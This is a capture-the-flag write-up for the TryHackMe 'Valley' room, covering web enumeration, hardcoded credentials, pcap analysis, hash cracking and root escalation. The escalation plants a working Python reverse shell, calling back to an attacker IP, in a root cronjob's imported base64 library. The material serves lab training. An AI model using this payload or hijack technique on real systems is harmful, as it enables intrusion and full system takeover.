---
title: 'Valley'
description: 'Web enumeration, pcacp investigation and privilege escalation through a Python cronjob with root permissions'
pubDate: 2023-06-02
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/2700326f6bf2127c414a0fa4582496cd.png'
---

http://10.10.97.14/static/00

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

### Login page
http://10.10.97.14/dev1243224123123/

In the JavaScript on the login page (http://10.10.97.14/dev1243224123123/dev.js):

```js
    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    }
```

http://10.10.97.14/dev1243224123123/devNotes37370.txt

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

## FTP login
```bash
ftp ftp://siemDev:california@10.10.97.14:37370
```

## USER
From the `siemHTTP2.pcapng` file we filter on `http.request.method == POST` and find:
`uname=valleyDev&psw=ph0t0s1234&remember=onHTTP/1.1 200 OK`


```bash
ssh valleyDev@10.10.97.14 # -> ph0t0s1234
```

## ROOT

```
$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
valley:x:1000:1000:,,,:/home/valley:/bin/bash
siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash
```

```bash
scp valleyDev@10.10.97.14:/home/valleyAuthenticator . # -> ph0t0s1234
```

Running strings on the binary shows its packed with UPX, unpacking it:

```bash
upx -d -o unpacked valleyAuthenticator
```

Running `strings` on it:

```bash
strings unpacked > unpacked.strings
```

In the strings output we find two hashes:

```
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
```

Putting those in https://crackstation.net/ shows:

```
e6722920bab2326f8217e4bf6b1b58ac	md5	liberty123
dd2921cc76ee3abfd2beb60709056cfb	md5	valley
```

    username: valley
    password: liberty123

```bash
ssh valley@10.10.54.57 # -> liberty123
```

## ROOT

User valley is member of the valleyAdmin group.

```bash
alley@valley:~/exp_dir$ groups
valley valleyAdmin
```

Searching for files this group can access:

```bash
valley@valley:~/exp_dir$ find / -group valleyAdmin 2>/dev/null
/usr/lib/python3.8
/usr/lib/python3.8/base64.py
```

Checking the cronjobs:

```bash
cat /etc/crontab
...[snip]...
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

In this script the base64 library is imported:

```python
#!/usr/bin/python3
import base64
for i in range(1,7):
...[snip]...
```

We can put a simple Python reverse shell in the `/usr/lib/python3.8/base64.py`:

```python
import os,pty,socket
s=socket.socket()
s.connect(("10.8.119.137",4444))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
pty.spawn("bash")
```
and start a listener on port 4444, on the next minute it should execute and return a root shell.
